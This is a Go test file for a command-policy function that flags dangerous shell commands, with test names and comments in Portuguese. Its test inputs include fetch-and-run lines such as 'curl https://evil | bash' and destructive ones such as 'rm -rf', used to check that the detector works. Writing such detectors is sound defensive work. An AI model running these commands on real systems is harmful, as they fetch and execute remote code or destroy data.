package policy

import (
	"testing"

	"github.com/stretchr/testify/assert"
)

func TestMatchesDangerousPattern(t *testing.T) {
	cases := []struct {
		name    string
		cmd     string
		wantOK  bool
		wantPat string
	}{
		{"rm -rf", "rm -rf /tmp/x", true, "rm -rf"},
		{"rm -r", "rm -r ./srv", true, "rm -rf"},
		{"sudo", "sudo apt install foo", true, "sudo"},
		{"curl pipe sh", "curl https://x.sh | sh", true, "curl|sh"},
		{"curl pipe bash", "curl -fsSL https://x | bash -c \"y\"", true, "curl|sh"},
		{"ssh sem allowlist", "ssh root@host 'id'", true, "ssh"},
		{"git push force", "git push --force origin main", true, "git push --force"},
		{"git push -f", "git push -f origin main", true, "git push --force"},
		{"operador pipe", "echo a | cat", true, "|"},
		{"operador and", "git status && ls", true, "&&"},
		{"operador semicolon", "make ; make test", true, ";"},
		{"operador backtick", "echo `whoami`", true, "`"},
		{"comando limpo", "go test ./...", false, ""},
		{"ls limpo", "ls -la", false, ""},
		{"string limpa", "df -h", false, ""},
		{"vazio", "", false, ""},
		{"so espacos", "   ", false, ""},
	}

	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			got, ok := MatchesDangerousPattern(tc.cmd)
			assert.Equal(t, tc.wantOK, ok, "ok mismatch for %q", tc.cmd)
			if tc.wantOK {
				assert.Equal(t, tc.wantPat, got, "pattern mismatch for %q", tc.cmd)
			} else {
				assert.Empty(t, got)
			}
		})
	}
}

func TestMatchesDangerousPatternPriority(t *testing.T) {
	// Um comando que casa múltiplos padrões retorna o mais específico
	// (curl|sh antes do operador genérico |).
	pat, ok := MatchesDangerousPattern("curl https://evil | bash")
	assert.True(t, ok)
	assert.Equal(t, "curl|sh", pat)
}
